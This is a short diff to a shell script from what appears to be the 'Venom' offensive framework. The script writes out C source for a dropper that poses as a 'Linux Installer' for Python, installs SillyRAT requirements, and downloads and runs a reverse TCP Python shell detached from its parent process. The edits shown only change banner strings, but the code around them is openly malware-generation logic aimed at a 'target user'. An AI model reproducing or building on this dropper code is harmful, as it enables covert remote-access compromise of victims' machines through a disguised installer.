@@ -10378,7 +10378,7 @@ elif [ "$SOSP" = "Linux" ]; then
       if [ "$vbsevasion" = "ON" ]; then
          echo "Framework: Venom v1.0.17 - Amsi Evasion - Agent nº6" >> $Drop.c
       else
-         echo "Framework: Venom v1.0.17 - Multi-OS - Agent nº 5" >> $Drop.c
+         echo "Framework: Venom v1.0.17 - Multi-OS - Agent nº5" >> $Drop.c
       fi
       echo "Function: Install python3 SillyRAT requirements before downloading and executing" >> $Drop.c
       echo "$Drop.py (Client reverse tcp python shell) detach from parent (dropper) process." >> $Drop.c
@@ -10399,7 +10399,7 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "         We are runing in parent process (child its also running)" >> $Drop.c
       echo "         Function: Install python3 and sillyrat requirements" >> $Drop.c
       echo "         */" >> $Drop.c
-      echo "         printf(\"\\\n$Drop - 3.10.5 Linux Installer\\\n\");" >> $Drop.c
+      echo "         printf(\"\\\n$Drop - 3.10.5-dev-32bit Linux Installer\\\n\");" >> $Drop.c
       echo "         printf(\"----------------------------------------------------\\\n\");" >> $Drop.c
       echo "         /* Display system information onscreen to target user */" >> $Drop.c
       echo "         sleep(1);system(\"c=\$(hostnamectl);echo \\\"\$c\\\"\");" >> $Drop.c
